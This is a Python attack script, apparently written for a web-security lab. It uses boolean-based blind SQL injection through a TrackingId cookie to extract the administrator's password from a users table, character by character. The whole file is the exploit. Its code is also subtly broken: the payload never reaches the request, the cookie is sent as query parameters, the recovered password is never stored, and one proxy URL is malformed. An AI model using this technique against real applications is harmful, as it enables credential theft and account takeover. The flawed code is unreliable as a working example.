import urllib.parse
import requests
import sys
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http:127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted="" # we are taking password extracted as empty string now 
    for i in range(1,3):
        for j in  range(32,126):  #using ascii value for the alphanumeric and all the special character 
            sqli_payload="' AND (SELECT ascii(substring(password,%s,1)) FROM users WHERE username='administrator')='%s'--" %(i,j)
            sqli_encoded_payload=urllib.parse.quote(sqli_payload) #url encode gardincha
            cookie={'TrackingId':'vcf1ztSALCYJvqVi','session':'MFa1a5yhEAmtNek1OuiL0RnflZbsLpX0'}
            r=requests.get(url,cookie,verify=False,proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r'+password_extracted+chr(j))
                sys.stdout.flush()
            else:
                sys.stdout.write('\r'+password_extracted+chr(j))    
                sys.stdout.flush()
                break
 

def main():
    if len(sys.argv)!=2:
        print("(+)Usage %s <url>" % sys.argv[0])
        print("(+)Example %s www.example.com" % sys.argv[0])
    else:
        url=sys.argv[1]
        print("(+)Retrieving the administrator password........")
        sqli_password(url)

if __name__=="__main__":
    main()
